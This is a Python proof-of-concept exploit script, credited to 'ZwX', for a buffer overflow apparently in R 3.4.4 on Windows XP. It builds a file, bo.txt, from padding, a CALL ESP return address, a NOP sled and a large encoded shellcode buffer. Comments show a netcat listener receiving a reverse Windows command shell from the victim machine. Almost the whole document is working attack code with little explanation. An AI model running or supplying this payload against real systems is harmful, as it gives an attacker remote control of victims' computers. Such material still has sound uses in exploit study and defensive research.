
#!/usr/bin/python

#root@kali:~# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.11.187] from (UNKNOWN) [192.168.11.177] 1061
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Program Files\R\R-3.4.4\bin\i386>


from struct import pack
#buffer = "A"*2975

#root@kali:~# /usr/bin/msf-pattern_offset -q 6A41376A
#[*] Exact match at offset 292
#root@kali:~# /usr/bin/msf-pattern_offset -q 42366442
#[*] Exact match at offset 888


#Final size of python file: 3400 bytes
buf =  ""
buf += "\x89\xe5\xda\xc9\xd9\x75\xf4\x5f\x57\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x49\x6c\x6b\x58\x4e"
buf += "\x62\x73\x30\x37\x70\x55\x50\x71\x70\x6e\x69\x58\x65"
buf += "\x36\x51\x49\x50\x53\x54\x4e\x6b\x42\x70\x66\x50\x4e"
buf += "\x6b\x46\x32\x64\x4c\x6c\x4b\x32\x72\x64\x54\x6c\x4b"
buf += "\x62\x52\x36\x48\x54\x4f\x6d\x67\x32\x6a\x36\x46\x74"
buf += "\x71\x69\x6f\x4e\x4c\x35\x6c\x65\x31\x73\x4c\x46\x62"
buf += "\x74\x6c\x71\x30\x6b\x71\x6a\x6f\x44\x4d\x43\x31\x68"
buf += "\x47\x7a\x42\x69\x62\x73\x62\x51\x47\x4c\x4b\x76\x32"
buf += "\x72\x30\x6e\x6b\x70\x4a\x67\x4c\x6e\x6b\x70\x4c\x76"
buf += "\x71\x72\x58\x4b\x53\x70\x48\x76\x61\x48\x51\x73\x61"
buf += "\x4e\x6b\x50\x59\x37\x50\x33\x31\x6a\x73\x4c\x4b\x31"
buf += "\x59\x55\x48\x49\x73\x54\x7a\x30\x49\x6c\x4b\x36\x54"
buf += "\x4e\x6b\x67\x71\x78\x56\x36\x51\x39\x6f\x6e\x4c\x59"
buf += "\x51\x68\x4f\x46\x6d\x56\x61\x58\x47\x55\x68\x49\x70"
buf += "\x61\x65\x5a\x56\x73\x33\x33\x4d\x7a\x58\x77\x4b\x33"
buf += "\x4d\x34\x64\x44\x35\x48\x64\x36\x38\x6c\x4b\x50\x58"
buf += "\x51\x34\x47\x71\x4b\x63\x73\x56\x6c\x4b\x54\x4c\x52"
buf += "\x6b\x4c\x4b\x61\x48\x57\x6c\x45\x51\x38\x53\x4e\x6b"
buf += "\x44\x44\x6c\x4b\x36\x61\x78\x50\x4c\x49\x67\x34\x65"
buf += "\x74\x45\x74\x53\x6b\x71\x4b\x31\x71\x33\x69\x63\x6a"
buf += "\x66\x31\x69\x6f\x49\x70\x43\x6f\x31\x4f\x33\x6a\x6e"
buf += "\x6b\x36\x72\x78\x6b\x4c\x4d\x43\x6d\x31\x78\x30\x33"
buf += "\x70\x32\x65\x50\x35\x50\x31\x78\x62\x57\x43\x43\x47"
buf += "\x42\x33\x6f\x51\x44\x62\x48\x62\x6c\x33\x47\x75\x76"
buf += "\x73\x37\x69\x6f\x48\x55\x38\x38\x6c\x50\x46\x61\x53"
buf += "\x30\x33\x30\x36\x49\x38\x44\x70\x54\x52\x70\x30\x68"
buf += "\x74\x69\x6d\x50\x42\x4b\x43\x30\x6b\x4f\x4a\x75\x66"
buf += "\x30\x36\x30\x42\x70\x52\x70\x63\x70\x30\x50\x33\x70"
buf += "\x62\x70\x53\x58\x79\x7a\x54\x4f\x69\x4f\x4b\x50\x4b"
buf += "\x4f\x6e\x35\x6c\x57\x61\x7a\x44\x45\x43\x58\x79\x50"
buf += "\x6c\x68\x54\x4b\x4f\x4b\x61\x78\x46\x62\x45\x50\x35"
buf += "\x45\x38\x33\x4d\x59\x49\x76\x31\x7a\x32\x30\x61\x46"
buf += "\x50\x57\x42\x48\x6a\x39\x59\x35\x31\x64\x53\x51\x59"
buf += "\x6f\x7a\x75\x6b\x35\x79\x50\x64\x34\x34\x4c\x4b\x4f"
buf += "\x52\x6e\x63\x38\x74\x35\x68\x6c\x51\x78\x48\x70\x6d"
buf += "\x65\x4c\x62\x51\x46\x69\x6f\x6b\x65\x62\x48\x75\x33"
buf += "\x32\x4d\x42\x44\x75\x50\x6d\x59\x4d\x33\x72\x77\x56"
buf += "\x37\x46\x37\x55\x61\x5a\x56\x62\x4a\x37\x62\x42\x79"
buf += "\x51\x46\x6d\x32\x79\x6d\x51\x76\x69\x57\x72\x64\x37"
buf += "\x54\x45\x6c\x67\x71\x56\x61\x6c\x4d\x32\x64\x54\x64"
buf += "\x42\x30\x6b\x76\x75\x50\x33\x74\x30\x54\x56\x30\x32"
buf += "\x76\x43\x66\x50\x56\x52\x66\x61\x46\x30\x4e\x71\x46"
buf += "\x46\x36\x31\x43\x50\x56\x35\x38\x61\x69\x5a\x6c\x75"
buf += "\x6f\x4d\x56\x6b\x4f\x38\x55\x4e\x69\x79\x70\x72\x6e"
buf += "\x42\x76\x61\x56\x39\x6f\x36\x50\x53\x58\x36\x68\x6e"
buf += "\x67\x55\x4d\x45\x30\x4b\x4f\x69\x45\x6d\x6b\x48\x70"
buf += "\x38\x35\x59\x32\x43\x66\x73\x58\x4c\x66\x6d\x45\x4d"
buf += "\x6d\x6d\x4d\x6b\x4f\x78\x55\x37\x4c\x44\x46\x71\x6c"
buf += "\x77\x7a\x6f\x70\x79\x6b\x59\x70\x54\x35\x77\x75\x4f"
buf += "\x4b\x57\x37\x62\x33\x63\x42\x62\x4f\x30\x6a\x33\x30"
buf += "\x42\x73\x79\x6f\x6b\x65\x41\x41"

#6BF22629   FFD4             CALL ESP

buffer="A" * 292 + "\x29\x26\xF2\x6B" + "\x90" * 5 + buf +  "C" * (2975-292-4-len(buf)-5)

file = open("bo.txt","w")
file.write(buffer)
file.close()

print "POC Created by ZwX"
